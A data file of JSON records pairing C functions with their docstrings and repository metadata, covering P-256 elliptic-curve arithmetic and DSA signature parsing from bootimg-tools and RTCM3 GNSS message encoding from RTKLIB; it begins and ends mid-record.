"pbatard/bootimg-tools", "stars": 148, "license": "apache-2.0", "language": "c", "size": 62}
{"docstring": "/* felem_sum sets out = in+in2.\n *\n * On entry, in[i]+in2[i] must not overflow a 32-bit word.\n * On exit: out[0,2,...] < 2**30, out[1,3,...] < 2**29 */\n", "func_signal": "static void felem_sum(felem out, const felem in, const felem in2)", "code": "{\n  limb carry = 0;\n  unsigned i;\n\n  for (i = 0;; i++) {\n    out[i] = in[i] + in2[i];\n    out[i] += carry;\n    carry = out[i] >> 29;\n    out[i] &= kBottom29Bits;\n\n    i++;\n    if (i == NLIMBS)\n      break;\n\n    out[i] = in[i] + in2[i];\n    out[i] += carry;\n    carry = out[i] >> 28;\n    out[i] &= kBottom28Bits;\n  }\n\n  felem_reduce_carry(out, carry);\n}", "path": "libmincrypt\\p256_ec.c", "repo_name": "pbatard/bootimg-tools", "stars": 148, "license": "apache-2.0", "language": "c", "size": 62}
{"docstring": "// top, c[] -= top_a, a[]\n", "func_signal": "static p256_digit subTop(p256_digit top_a,\n                         const p256_digit* a,\n                         p256_digit top_c,\n                         p256_digit* c)", "code": "{\n  int i;\n  p256_sddigit borrow = 0;\n\n  for (i = 0; i < P256_NDIGITS; ++i) {\n    borrow += *c;\n    borrow -= *a++;\n    *c++ = (p256_digit)borrow;\n    borrow >>= P256_BITSPERDIGIT;\n  }\n  borrow += top_c;\n  borrow -= top_a;\n  top_c = (p256_digit)borrow;\n  assert((borrow >> P256_BITSPERDIGIT) == 0);\n  return top_c;\n}", "path": "libmincrypt\\p256.c", "repo_name": "pbatard/bootimg-tools", "stars": 148, "license": "apache-2.0", "language": "c", "size": 62}
{"docstring": "// b = a + d. Returns carry, 0 or 1.\n", "func_signal": "int p256_add_d(const p256_int* a, p256_digit d, p256_int* b)", "code": "{\n  int i;\n  p256_ddigit carry = d;\n\n  for (i = 0; i < P256_NDIGITS; ++i) {\n    carry += (p256_ddigit)P256_DIGIT(a, i);\n    if (b) P256_DIGIT(b, i) = (p256_digit)carry;\n    carry >>= P256_BITSPERDIGIT;\n  }\n  return (int)carry;\n}", "path": "libmincrypt\\p256.c", "repo_name": "pbatard/bootimg-tools", "stars": 148, "license": "apache-2.0", "language": "c", "size": 62}
{"docstring": "/**\n * Unpacks the ASN.1 DSA signature sequence.\n */\n", "func_signal": "int dsa_sig_unpack(unsigned char* sig, int sig_len, p256_int* r_int, p256_int* s_int)", "code": "{\n    /*\n     * Structure is:\n     *   0x30 0xNN  SEQUENCE + s_length\n     *     0x02 0xNN  INTEGER + r_length\n     *       0xAA 0xBB ..   r_length bytes of \"r\" (offset 4)\n     *     0x02 0xNN  INTEGER + s_length\n     *       0xMM 0xNN ..   s_length bytes of \"s\" (offset 6 + r_len)\n     */\n    int seq_len;\n    unsigned char r_bytes[P256_NBYTES];\n    unsigned char s_bytes[P256_NBYTES];\n    int r_len;\n    int s_len;\n\n    memset(r_bytes, 0, sizeof(r_bytes));\n    memset(s_bytes, 0, sizeof(s_bytes));\n\n    /*\n     * Must have at least:\n     * 2 bytes sequence header and length\n     * 2 bytes R integer header and length\n     * 1 byte of R\n     * 2 bytes S integer header and length\n     * 1 byte of S\n     *\n     * 8 bytes total\n     */\n    if (sig_len < 8 || sig[0] != 0x30 || sig[2] != 0x02) {\n        return 0;\n    }\n\n    seq_len = sig[1];\n    if ((seq_len <= 0) || (seq_len + 2 != sig_len)) {\n        return 0;\n    }\n\n    r_len = sig[3];\n    /*\n     * Must have at least:\n     * 2 bytes for R header and length\n     * 2 bytes S integer header and length\n     * 1 byte of S\n     */\n    if ((r_len < 1) || (r_len > seq_len - 5) || (sig[4 + r_len] != 0x02)) {\n        return 0;\n    }\n    s_len = sig[5 + r_len];\n\n    /**\n     * Must have:\n     * 2 bytes for R header and length\n     * r_len bytes for R\n     * 2 bytes S integer header and length\n     */\n    if ((s_len < 1) || (s_len != seq_len - 4 - r_len)) {\n        return 0;\n    }\n\n    /*\n     * ASN.1 encoded integers are zero-padded for positive integers. Make sure we have\n     * a correctly-sized buffer and that the resulting integer isn't too large.\n     */\n    if (!trim_to_p256_bytes(r_bytes, &sig[4], r_len)\n            || !trim_to_p256_bytes(s_bytes, &sig[6 + r_len], s_len)) {\n        return 0;\n    }\n\n    p256_from_bin(r_bytes, r_int);\n    p256_from_bin(s_bytes, s_int);\n\n    return 1;\n}", "path": "libmincrypt\\dsa_sig.c", "repo_name": "pbatard/bootimg-tools", "stars": 148, "license": "apache-2.0", "language": "c", "size": 62}
{"docstring": "// b = 1/a mod MOD, binary euclid.\n", "func_signal": "void p256_modinv_vartime(const p256_int* MOD,\n                         const p256_int* a,\n                         p256_int* b)", "code": "{\n  p256_int R = P256_ZERO;\n  p256_int S = P256_ONE;\n  p256_int U = *MOD;\n  p256_int V = *a;\n\n  for (;;) {\n    if (p256_is_even(&U)) {\n      p256_shr1(&U, 0, &U);\n      if (p256_is_even(&R)) {\n        p256_shr1(&R, 0, &R);\n      } else {\n        // R = (R+MOD)/2\n        p256_shr1(&R, p256_add(&R, MOD, &R), &R);\n      }\n    } else if (p256_is_even(&V)) {\n      p256_shr1(&V, 0, &V);\n      if (p256_is_even(&S)) {\n        p256_shr1(&S, 0, &S);\n      } else {\n        // S = (S+MOD)/2\n        p256_shr1(&S, p256_add(&S, MOD, &S) , &S);\n      }\n    } else {  // U,V both odd.\n      if (!p256_sub(&V, &U, NULL)) {\n        p256_sub(&V, &U, &V);\n        if (p256_sub(&S, &R, &S)) p256_add(&S, MOD, &S);\n        if (p256_is_zero(&V)) break;  // done.\n      } else {\n        p256_sub(&U, &V, &U);\n        if (p256_sub(&R, &S, &R)) p256_add(&R, MOD, &R);\n      }\n    }\n  }\n\n  p256_mod(MOD, &R, b);\n}", "path": "libmincrypt\\p256.c", "repo_name": "pbatard/bootimg-tools", "stars": 148, "license": "apache-2.0", "language": "c", "size": 62}
{"docstring": "/* felem_scalar_3 sets out=3*out.\n *\n * On entry: out[0,2,...] < 2**30, out[1,3,...] < 2**29.\n * On exit: out[0,2,...] < 2**30, out[1,3,...] < 2**29. */\n", "func_signal": "static void felem_scalar_3(felem out)", "code": "{\n  limb carry = 0;\n  unsigned i;\n\n  for (i = 0;; i++) {\n    out[i] *= 3;\n    out[i] += carry;\n    carry = out[i] >> 29;\n    out[i] &= kBottom29Bits;\n\n    i++;\n    if (i == NLIMBS)\n      break;\n\n    out[i] *= 3;\n    out[i] += carry;\n    carry = out[i] >> 28;\n    out[i] &= kBottom28Bits;\n  }\n\n  felem_reduce_carry(out, carry);\n}", "path": "libmincrypt\\p256_ec.c", "repo_name": "pbatard/bootimg-tools", "stars": 148, "license": "apache-2.0", "language": "c", "size": 62}
{"docstring": "/* Convenience function */\n", "func_signal": "const uint8_t* SHA256_hash(const void* data, int len, uint8_t* digest)", "code": "{\n    SHA256_CTX ctx;\n    SHA256_init(&ctx);\n    SHA256_update(&ctx, data, len);\n    memcpy(digest, SHA256_final(&ctx), SHA256_DIGEST_SIZE);\n    return digest;\n}", "path": "libmincrypt\\sha256.c", "repo_name": "pbatard/bootimg-tools", "stars": 148, "license": "apache-2.0", "language": "c", "size": 62}
{"docstring": "/* felem_is_zero_vartime returns 1 iff |in| == 0. It takes a variable amount of\n * time depending on the value of |in|. */\n", "func_signal": "static char felem_is_zero_vartime(const felem in)", "code": "{\n  limb carry;\n  int i;\n  limb tmp[NLIMBS];\n\n  felem_assign(tmp, in);\n\n  /* First, reduce tmp to a minimal form. */\n  do {\n    carry = 0;\n    for (i = 0;; i++) {\n      tmp[i] += carry;\n      carry = tmp[i] >> 29;\n      tmp[i] &= kBottom29Bits;\n\n      i++;\n      if (i == NLIMBS)\n        break;\n\n      tmp[i] += carry;\n      carry = tmp[i] >> 28;\n      tmp[i] &= kBottom28Bits;\n    }\n\n    felem_reduce_carry(tmp, carry);\n  } while (carry);\n\n  /* tmp < 2**257, so the only possible zero values are 0, p and 2p. */\n  return memcmp(tmp, kZero, sizeof(tmp)) == 0 ||\n         memcmp(tmp, kP, sizeof(tmp)) == 0 ||\n         memcmp(tmp, k2P, sizeof(tmp)) == 0;\n}", "path": "libmincrypt\\p256_ec.c", "repo_name": "pbatard/bootimg-tools", "stars": 148, "license": "apache-2.0", "language": "c", "size": 62}
{"docstring": "/* lock time indicator (ref [2] table 3.4-2) ---------------------------------*/\n", "func_signal": "static int to_lock(int lock)", "code": "{\n    if (lock<0  ) return 0;\n    if (lock<24 ) return lock;\n    if (lock<72 ) return (lock+24  )/2;\n    if (lock<168) return (lock+120 )/4;\n    if (lock<360) return (lock+408 )/8;\n    if (lock<744) return (lock+1176)/16;\n    if (lock<937) return (lock+3096)/32;\n    return 127;\n}", "path": "Package2\\RTKLIB-2.4.2p13\\src\\rtcm3e.c", "repo_name": "Francklin2/RTKLIB_Touchscreen_GUI", "stars": 168, "license": "None", "language": "c", "size": 225224}
{"docstring": "/* encode fine phase-range with extended resolution --------------------------*/\n", "func_signal": "static int encode_msm_phrng_ex(rtcm_t *rtcm, int i, const double *phrng,\n                               int ncell)", "code": "{\n    int j,phrng_val;\n    \n    for (j=0;j<ncell;j++) {\n        if (phrng[j]==0.0) {\n            phrng_val=-8388608;\n        }\n        else if (fabs(phrng[j])>1171.0) {\n            trace(2,\"msm fine phase-range ext overflow %s phrng=%.3f\\n\",\n                 time_str(rtcm->time,0),phrng[j]);\n            phrng_val=-8388608;\n        }\n        else {\n            phrng_val=ROUND(phrng[j]/RANGE_MS/P2_31);\n        }\n        setbits(rtcm->buff,i,24,phrng_val); i+=24;\n    }\n    return i;\n}", "path": "Package2\\RTKLIB-2.4.2p13\\src\\rtcm3e.c", "repo_name": "Francklin2/RTKLIB_Touchscreen_GUI", "stars": 168, "license": "None", "language": "c", "size": 225224}
{"docstring": "/* encode type 1020: glonass ephemerides -------------------------------------*/\n", "func_signal": "static int encode_type1020(rtcm_t *rtcm, int sync)", "code": "{\n    geph_t *geph;\n    gtime_t time;\n    double ep[6];\n    int i=24,j,prn,tk_h,tk_m,tk_s,tb,pos[3],vel[3],acc[3],gamn,taun,dtaun;\n    int fcn,NT;\n    \n    trace(3,\"encode_type1020: sync=%d\\n\",sync);\n    \n    if (satsys(rtcm->ephsat,&prn)!=SYS_GLO) return 0;\n    geph=rtcm->nav.geph+prn-1;\n    if (geph->sat!=rtcm->ephsat) return 0;\n    fcn=geph->frq+7;\n    \n    /* time of frame within day (utc(su) + 3 hr) */\n    time=timeadd(gpst2utc(geph->tof),10800.0);\n    time2epoch(time,ep);\n    tk_h=(int)ep[3];\n    tk_m=(int)ep[4];\n    tk_s=ROUND(ep[5]/30.0);\n    \n    /* # of days since jan 1 in leap year */\n    ep[0]=floor(ep[0]/4.0)*4.0; ep[1]=ep[2]=1.0;\n    ep[3]=ep[4]=ep[5]=0.0;\n    NT=(int)floor(timediff(time,epoch2time(ep))/86400.+1.0);\n    \n    /* index of time interval within day (utc(su) + 3 hr) */\n    time=timeadd(gpst2utc(geph->toe),10800.0);\n    time2epoch(time,ep);\n    tb=ROUND((ep[3]*3600.0+ep[4]*60.0+ep[5])/900.0);\n    \n    for (j=0;j<3;j++) {\n        pos[j]=ROUND(geph->pos[j]/P2_11/1E3);\n        vel[j]=ROUND(geph->vel[j]/P2_20/1E3);\n        acc[j]=ROUND(geph->acc[j]/P2_30/1E3);\n    }\n    gamn =ROUND(geph->gamn /P2_40);\n    taun =ROUND(geph->taun /P2_30);\n    dtaun=ROUND(geph->dtaun/P2_30);\n    \n    setbitu(rtcm->buff,i,12,1020     ); i+=12;\n    setbitu(rtcm->buff,i, 6,prn      ); i+= 6;\n    setbitu(rtcm->buff,i, 5,fcn      ); i+= 5;\n    setbitu(rtcm->buff,i, 4,0        ); i+= 4; /* almanac health,P1 */\n    setbitu(rtcm->buff,i, 5,tk_h     ); i+= 5;\n    setbitu(rtcm->buff,i, 6,tk_m     ); i+= 6;\n    setbitu(rtcm->buff,i, 1,tk_s     ); i+= 1;\n    setbitu(rtcm->buff,i, 1,geph->svh); i+= 1; /* Bn */\n    setbitu(rtcm->buff,i, 1,0        ); i+= 1; /* P2 */\n    setbitu(rtcm->buff,i, 7,tb       ); i+= 7;\n    setbitg(rtcm->buff,i,24,vel[0]   ); i+=24;\n    setbitg(rtcm->buff,i,27,pos[0]   ); i+=27;\n    setbitg(rtcm->buff,i, 5,acc[0]   ); i+= 5;\n    setbitg(rtcm->buff,i,24,vel[1]   ); i+=24;\n    setbitg(rtcm->buff,i,27,pos[1]   ); i+=27;\n    setbitg(rtcm->buff,i, 5,acc[1]   ); i+= 5;\n    setbitg(rtcm->buff,i,24,vel[2]   ); i+=24;\n    setbitg(rtcm->buff,i,27,pos[2]   ); i+=27;\n    setbitg(rtcm->buff,i, 5,acc[2]   ); i+= 5;\n    setbitu(rtcm->buff,i, 1,0        ); i+= 1; /* P3 */\n    setbitg(rtcm->buff,i,11,gamn     ); i+=11;\n    setbitu(rtcm->buff,i, 3,0        ); i+= 3; /* P,ln */\n    setbitg(rtcm->buff,i,22,taun     ); i+=22;\n    setbitu(rtcm->buff,i, 5,dtaun    ); i+= 5;\n    setbitu(rtcm->buff,i, 5,geph->age); i+= 5; /* En */\n    setbitu(rtcm->buff,i, 1,0        ); i+= 1; /* P4 */\n    setbitu(rtcm->buff,i, 4,0        ); i+= 4; /* FT */\n    setbitu(rtcm->buff,i,11,NT       ); i+=11;\n    setbitu(rtcm->buff,i, 2,0        ); i+= 2; /* M */\n    setbitu(rtcm->buff,i, 1,0        ); i+= 1; /* flag for addtional data */\n    setbitu(rtcm->buff,i,11,0        ); i+=11; /* NA */\n    setbitu(rtcm->buff,i,32,0        ); i+=32; /* tauc */\n    setbitu(rtcm->buff,i, 5,0        ); i+= 5; /* N4 */\n    setbitu(rtcm->buff,i,22,0        ); i+=22; /* taugps */\n    setbitu(rtcm->buff,i, 1,0        ); i+= 1; /* ln */\n    setbitu(rtcm->buff,i, 7,0        ); i+= 7;\n    rtcm->nbit=i;\n    return 1;\n}", "path": "Package2\\RTKLIB-2.4.2p13\\src\\rtcm3e.c", "repo_name": "Francklin2/RTKLIB_Touchscreen_GUI", "stars": 168, "license": "None", "language": "c", "size": 225224}
{"docstring": "/* encode type 1046: galileo I/NAV satellite ephemerides ---------------------*/\n", "func_signal": "static int encode_type1046(rtcm_t *rtcm, int sync)", "code": "{\n    eph_t *eph;\n    unsigned int sqrtA,e;\n    int i=24,prn,week,toe,toc,i0,OMG0,omg,M0,deln,idot,OMGd,crs,crc;\n    int cus,cuc,cis,cic,af0,af1,af2,bgd1,bgd2,oshs1,osdvs1,oshs2,osdvs2;\n    \n    trace(3,\"encode_type1046: sync=%d\\n\",sync);\n    \n    if (satsys(rtcm->ephsat,&prn)!=SYS_GAL) return 0;\n    eph=rtcm->nav.eph+rtcm->ephsat-1;\n    if (eph->sat!=rtcm->ephsat) return 0;\n    week=(eph->week-1024)%4096; /* gst-week = gal-week - 1024 */\n    toe  =ROUND(eph->toes/60.0);\n    toc  =ROUND(time2gpst(eph->toc,NULL)/60.0);\n    sqrtA=ROUND_U(sqrt(eph->A)/P2_19);\n    e    =ROUND_U(eph->e/P2_33);\n    i0   =ROUND(eph->i0  /P2_31/SC2RAD);\n    OMG0 =ROUND(eph->OMG0/P2_31/SC2RAD);\n    omg  =ROUND(eph->omg /P2_31/SC2RAD);\n    M0   =ROUND(eph->M0  /P2_31/SC2RAD);\n    deln =ROUND(eph->deln/P2_43/SC2RAD);\n    idot =ROUND(eph->idot/P2_43/SC2RAD);\n    OMGd =ROUND(eph->OMGd/P2_43/SC2RAD);\n    crs  =ROUND(eph->crs/P2_5 );\n    crc  =ROUND(eph->crc/P2_5 );\n    cus  =ROUND(eph->cus/P2_29);\n    cuc  =ROUND(eph->cuc/P2_29);\n    cis  =ROUND(eph->cis/P2_29);\n    cic  =ROUND(eph->cic/P2_29);\n    af0  =ROUND(eph->f0 /P2_34);\n    af1  =ROUND(eph->f1 /P2_46);\n    af2  =ROUND(eph->f2 /P2_59);\n    bgd1 =ROUND(eph->tgd[0]/P2_32); /* E5a/E1 */\n    bgd2 =ROUND(eph->tgd[1]/P2_32); /* E5b/E1 */\n    oshs1 =(eph->svh>>7)&3;         /* E5b SVH */\n    osdvs1=(eph->svh>>6)&1;         /* E5b DVS */\n    oshs2 =(eph->svh>>1)&3;         /* E1 SVH */\n    osdvs2=(eph->svh>>0)&1;         /* E1 DVS */\n    setbitu(rtcm->buff,i,12,1046     ); i+=12;\n    setbitu(rtcm->buff,i, 6,prn      ); i+= 6;\n    setbitu(rtcm->buff,i,12,week     ); i+=12;\n    setbitu(rtcm->buff,i,10,eph->iode); i+=10;\n    setbitu(rtcm->buff,i, 8,eph->sva ); i+= 8;\n    setbits(rtcm->buff,i,14,idot     ); i+=14;\n    setbitu(rtcm->buff,i,14,toc      ); i+=14;\n    setbits(rtcm->buff,i, 6,af2      ); i+= 6;\n    setbits(rtcm->buff,i,21,af1      ); i+=21;\n    setbits(rtcm->buff,i,31,af0      ); i+=31;\n    setbits(rtcm->buff,i,16,crs      ); i+=16;\n    setbits(rtcm->buff,i,16,deln     ); i+=16;\n    setbits(rtcm->buff,i,32,M0       ); i+=32;\n    setbits(rtcm->buff,i,16,cuc      ); i+=16;\n    setbitu(rtcm->buff,i,32,e        ); i+=32;\n    setbits(rtcm->buff,i,16,cus      ); i+=16;\n    setbitu(rtcm->buff,i,32,sqrtA    ); i+=32;\n    setbitu(rtcm->buff,i,14,toe      ); i+=14;\n    setbits(rtcm->buff,i,16,cic      ); i+=16;\n    setbits(rtcm->buff,i,32,OMG0     ); i+=32;\n    setbits(rtcm->buff,i,16,cis      ); i+=16;\n    setbits(rtcm->buff,i,32,i0       ); i+=32;\n    setbits(rtcm->buff,i,16,crc      ); i+=16;\n    setbits(rtcm->buff,i,32,omg      ); i+=32;\n    setbits(rtcm->buff,i,24,OMGd     ); i+=24;\n    setbits(rtcm->buff,i,10,bgd1     ); i+=10;\n    setbits(rtcm->buff,i,10,bgd2     ); i+=10;\n    setbitu(rtcm->buff,i, 2,oshs1    ); i+= 2; /* E5b SVH */\n    setbitu(rtcm->buff,i, 1,osdvs1   ); i+= 1; /* E5b DVS */\n    setbitu(rtcm->buff,i, 2,oshs2    ); i+= 2; /* E1 SVH */\n    setbitu(rtcm->buff,i, 1,osdvs2   ); i+= 1; /* E1 DVS */\n    rtcm->nbit=i;\n    return 1;\n}", "path": "Package2\\RTKLIB-2.4.2p13\\src\\rtcm3e.c", "repo_name": "Francklin2/RTKLIB_Touchscreen_GUI", "stars": 168, "license": "None", "language": "c", "size": 225224}
{"docstring": "/* satellite position by precise ephemeris -----------------------------------*/\n", "func_signal": "static int pephpos(gtime_t time, int sat, const nav_t *nav, double *rs,\n                   double *dts, double *vare, double *varc)", "code": "{\n    double t[NMAX+1],p[3][NMAX+1],c[2],*pos,std=0.0,s[3],sinl,cosl;\n    int i,j,k,index;\n    \n    trace(4,\"pephpos : time=%s sat=%2d\\n\",time_str(time,3),sat);\n    \n    rs[0]=rs[1]=rs[2]=dts[0]=0.0;\n    \n    if (nav->ne<NMAX+1||\n        timediff(time,nav->peph[0].time)<-MAXDTE||\n        timediff(time,nav->peph[nav->ne-1].time)>MAXDTE) {\n        trace(2,\"no prec ephem %s sat=%2d\\n\",time_str(time,0),sat);\n        return 0;\n    }\n    /* binary search */\n    for (i=0,j=nav->ne-1;i<j;) {\n        k=(i+j)/2;\n        if (timediff(nav->peph[k].time,time)<0.0) i=k+1; else j=k;\n    }\n    index=i<=0?0:i-1;\n    \n    /* polynomial interpolation for orbit */\n    i=index-(NMAX+1)/2;\n    if (i<0) i=0; else if (i+NMAX>=nav->ne) i=nav->ne-NMAX-1;\n    \n    for (j=0;j<=NMAX;j++) {\n        t[j]=timediff(nav->peph[i+j].time,time);\n        if (norm(nav->peph[i+j].pos[sat-1],3)<=0.0) {\n            trace(2,\"prec ephem outage %s sat=%2d\\n\",time_str(time,0),sat);\n            return 0;\n        }\n    }\n    for (j=0;j<=NMAX;j++) {\n        pos=nav->peph[i+j].pos[sat-1];\n#if 0\n        p[0][j]=pos[0];\n        p[1][j]=pos[1];\n#else\n        /* correciton for earh rotation ver.2.4.0 */\n        sinl=sin(OMGE*t[j]);\n        cosl=cos(OMGE*t[j]);\n        p[0][j]=cosl*pos[0]-sinl*pos[1];\n        p[1][j]=sinl*pos[0]+cosl*pos[1];\n#endif\n        p[2][j]=pos[2];\n    }\n    for (i=0;i<3;i++) {\n        rs[i]=interppol(t,p[i],NMAX+1);\n    }\n    if (vare) {\n        for (i=0;i<3;i++) s[i]=nav->peph[index].std[sat-1][i];\n        std=norm(s,3);\n        \n        /* extrapolation error for orbit */\n        if      (t[0   ]>0.0) std+=EXTERR_EPH*SQR(t[0   ])/2.0;\n        else if (t[NMAX]<0.0) std+=EXTERR_EPH*SQR(t[NMAX])/2.0;\n        *vare=SQR(std);\n    }\n    /* linear interpolation for clock */\n    t[0]=timediff(time,nav->peph[index  ].time);\n    t[1]=timediff(time,nav->peph[index+1].time);\n    c[0]=nav->peph[index  ].pos[sat-1][3];\n    c[1]=nav->peph[index+1].pos[sat-1][3];\n    \n    if (t[0]<=0.0) {\n        if ((dts[0]=c[0])!=0.0) {\n            std=nav->peph[index].std[sat-1][3]*CLIGHT-EXTERR_CLK*t[0];\n        }\n    }\n    else if (t[1]>=0.0) {\n        if ((dts[0]=c[1])!=0.0) {\n            std=nav->peph[index+1].std[sat-1][3]*CLIGHT+EXTERR_CLK*t[1];\n        }\n    }\n    else if (c[0]!=0.0&&c[1]!=0.0) {\n        dts[0]=(c[1]*t[0]-c[0]*t[1])/(t[0]-t[1]);\n        i=t[0]<-t[1]?0:1;\n        std=nav->peph[index+i].std[sat-1][3]+EXTERR_CLK*fabs(t[i]);\n    }\n    else {\n        dts[0]=0.0;\n    }\n    if (varc) *varc=SQR(std);\n    return 1;\n}", "path": "Package2\\RTKLIB-2.4.2p13\\src\\preceph.c", "repo_name": "Francklin2/RTKLIB_Touchscreen_GUI", "stars": 168, "license": "None", "language": "c", "size": 225224}
{"docstring": "/* encode type 1033: receiver and antenna descriptor -------------------------*/\n", "func_signal": "static int encode_type1033(rtcm_t *rtcm, int sync)", "code": "{\n    int i=24,j,antsetup=rtcm->sta.antsetup;\n    int n=MIN(strlen(rtcm->sta.antdes ),31);\n    int m=MIN(strlen(rtcm->sta.antsno ),31);\n    int I=MIN(strlen(rtcm->sta.rectype),31);\n    int J=MIN(strlen(rtcm->sta.recver ),31);\n    int K=MIN(strlen(rtcm->sta.recsno ),31);\n    \n    trace(3,\"encode_type1033: sync=%d\\n\",sync);\n    \n    setbitu(rtcm->buff,i,12,1033       ); i+=12;\n    setbitu(rtcm->buff,i,12,rtcm->staid); i+=12;\n    \n    setbitu(rtcm->buff,i,8,n); i+= 8;\n    for (j=0;j<n;j++) {\n        setbitu(rtcm->buff,i,8,rtcm->sta.antdes[j]); i+=8;\n    }\n    setbitu(rtcm->buff,i,8,antsetup); i+= 8;\n    \n    setbitu(rtcm->buff,i,8,m); i+= 8;\n    for (j=0;j<m;j++) {\n        setbitu(rtcm->buff,i,8,rtcm->sta.antsno[j]); i+=8;\n    }\n    setbitu(rtcm->buff,i,8,I); i+= 8;\n    for (j=0;j<I;j++) {\n        setbitu(rtcm->buff,i,8,rtcm->sta.rectype[j]); i+=8;\n    }\n    setbitu(rtcm->buff,i,8,J); i+= 8;\n    for (j=0;j<J;j++) {\n        setbitu(rtcm->buff,i,8,rtcm->sta.recver[j]); i+=8;\n    }\n    setbitu(rtcm->buff,i,8,K); i+= 8;\n    for (j=0;j<K;j++) {\n        setbitu(rtcm->buff,i,8,rtcm->sta.recsno[j]); i+=8;\n    }\n    rtcm->nbit=i;\n    return 1;\n}", "path": "Package2\\RTKLIB-2.4.2p13\\src\\rtcm3e.c", "repo_name": "Francklin2/RTKLIB_Touchscreen_GUI", "stars": 168, "license": "None", "language": "c", "size": 225224}
{"docstring": "/* encode extended satellite info --------------------------------------------*/\n", "func_signal": "static int encode_msm_info(rtcm_t *rtcm, int i, const unsigned char *info,\n                           int nsat)", "code": "{\n    int j;\n    \n    for (j=0;j<nsat;j++) {\n        setbitu(rtcm->buff,i,4,info[j]); i+=4;\n    }\n    return i;\n}", "path": "Package2\\RTKLIB-2.4.2p13\\src\\rtcm3e.c", "repo_name": "Francklin2/RTKLIB_Touchscreen_GUI", "stars": 168, "license": "None", "language": "c", "size": 225224}
{"docstring": "/* encode fine phase-range-rate ----------------------------------------------*/\n", "func_signal": "static int encode_msm_rate(rtcm_t *rtcm, int i, const double *rate, int ncell)", "code": "{\n    int j,rate_val;\n    \n    for (j=0;j<ncell;j++) {\n        if (rate[j]==0.0) {\n            rate_val=-16384;\n        }\n        else if (fabs(rate[j])>1.6384) {\n            trace(2,\"msm fine phase-range-rate overflow %s rate=%.3f\\n\",\n                 time_str(rtcm->time,0),rate[j]);\n            rate_val=-16384;\n        }\n        else {\n            rate_val=ROUND(rate[j]/0.0001);\n        }\n        setbitu(rtcm->buff,i,15,rate_val); i+=15;\n    }\n    return i;\n}", "path": "Package2\\RTKLIB-2.4.2p13\\src\\rtcm3e.c", "repo_name": "Francklin2/RTKLIB_Touchscreen_GUI", "stars": 168, "license": "None", "language": "c", "size": 225224}
{"docstring": "/* encode ssr 1: orbit corrections -------------------------------------------*/\n", "func_signal": "static int encode_ssr1(rtcm_t *rtcm, int sys, int sync)", "code": "{\n    double udint=0.0;\n    int i,j,iod=0,nsat,prn,iode,iodcrc,refd=0,np,ni,nj,offp,deph[3],ddeph[3];\n    \n    trace(3,\"encode_ssr1: sys=%d sync=%d\\n\",sys,sync);\n    \n    switch (sys) {\n        case SYS_GPS: np=6; ni= 8; nj= 0; offp=  0; break;\n        case SYS_GLO: np=5; ni= 8; nj= 0; offp=  0; break;\n        case SYS_GAL: np=6; ni=10; nj= 0; offp=  0; break;\n        case SYS_QZS: np=4; ni= 8; nj= 0; offp=192; break;\n        case SYS_CMP: np=6; ni=10; nj=24; offp=  1; break;\n        case SYS_SBS: np=6; ni= 9; nj=24; offp=120; break;\n        default: return 0;\n    }\n    /* number of satellites */\n    for (j=nsat=0;j<MAXSAT;j++) {\n        if (satsys(j+1,&prn)!=sys||!rtcm->ssr[j].update) continue;\n        nsat++;\n        udint=rtcm->ssr[j].udi[0];\n        iod  =rtcm->ssr[j].iod[0];\n        refd =rtcm->ssr[j].refd;\n    }\n    /* encode ssr header */\n    i=encode_ssr_head(1,rtcm,sys,nsat,sync,iod,udint,refd,0,0);\n    \n    for (j=0;j<MAXSAT;j++) {\n        if (satsys(j+1,&prn)!=sys||!rtcm->ssr[j].update) continue;\n        \n        iode=rtcm->ssr[j].iode;      /* sbas/bds: toe/t0 modulo */\n        iodcrc=rtcm->ssr[j].iodcrc;  /* sbas/bds: iod crc */\n        \n        deph [0]=ROUND(rtcm->ssr[j].deph [0]/1E-4);\n        deph [1]=ROUND(rtcm->ssr[j].deph [1]/4E-4);\n        deph [2]=ROUND(rtcm->ssr[j].deph [2]/4E-4);\n        ddeph[0]=ROUND(rtcm->ssr[j].ddeph[0]/1E-6);\n        ddeph[1]=ROUND(rtcm->ssr[j].ddeph[1]/4E-6);\n        ddeph[2]=ROUND(rtcm->ssr[j].ddeph[2]/4E-6);\n        \n        setbitu(rtcm->buff,i,np,prn-offp); i+=np; /* satellite id */\n        setbitu(rtcm->buff,i,ni,iode    ); i+=ni; /* iode */\n        setbitu(rtcm->buff,i,nj,iodcrc  ); i+=nj; /* iodcrc */\n        setbits(rtcm->buff,i,22,deph [0]); i+=22; /* delta radial */\n        setbits(rtcm->buff,i,20,deph [1]); i+=20; /* delta along-track */\n        setbits(rtcm->buff,i,20,deph [2]); i+=20; /* delta cross-track */\n        setbits(rtcm->buff,i,21,ddeph[0]); i+=21; /* dot delta radial */\n        setbits(rtcm->buff,i,19,ddeph[1]); i+=19; /* dot delta along-track */\n        setbits(rtcm->buff,i,19,ddeph[2]); i+=19; /* dot delta cross-track */\n    }\n    rtcm->nbit=i;\n    return 1;\n}", "path": "Package2\\RTKLIB-2.4.2p13\\src\\rtcm3e.c", "repo_name": "Francklin2/RTKLIB_Touchscreen_GUI", "stars": 168, "license": "None", "language": "c", "size": 225224}
{"docstring": "/* L2 code indicator glonass -------------------------------------------------*/\n", "func_signal": "static int to_code2_glo(unsigned char code)", "code": "{\n    switch (code) {\n        case CODE_L2C: return 0; /* L2 C/A */\n        case CODE_L2P: return 1; /* L2 P */\n    }\n    return 0;\n}", "path": "Package2\\RTKLIB-2.4.2p13\\src\\rtcm3e.c", "repo_name": "Francklin2/RTKLIB_Touchscreen_GUI", "stars": 168, "license": "None", "language": "c", "size": 225224}
{"docstring": "/* encode msm 3: compact pseudorange and phaserange --------------------------*/\n", "func_signal": "static int encode_msm3(rtcm_t *rtcm, int sys, int sync)", "code": "{\n    double rrng[64],rrate[64],psrng[64],phrng[64],lock[64];\n    unsigned char half[64];\n    int i,nsat,ncell;\n    \n    trace(3,\"encode_msm3: sys=%d sync=%d\\n\",sys,sync);\n    \n    /* encode msm header */\n    if (!(i=encode_msm_head(3,rtcm,sys,sync,&nsat,&ncell,rrng,rrate,NULL,psrng,\n                            phrng,NULL,lock,half,NULL))) {\n        return 0;\n    }\n    /* encode msm satellite data */\n    i=encode_msm_mod_rrng(rtcm,i,rrng ,nsat ); /* rough range modulo 1 ms */\n    \n    /* encode msm signal data */\n    i=encode_msm_psrng   (rtcm,i,psrng,ncell); /* fine pseudorange */\n    i=encode_msm_phrng   (rtcm,i,phrng,ncell); /* fine phase-range */\n    i=encode_msm_lock    (rtcm,i,lock ,ncell); /* lock-time indicator */\n    i=encode_msm_half_amb(rtcm,i,half ,ncell); /* 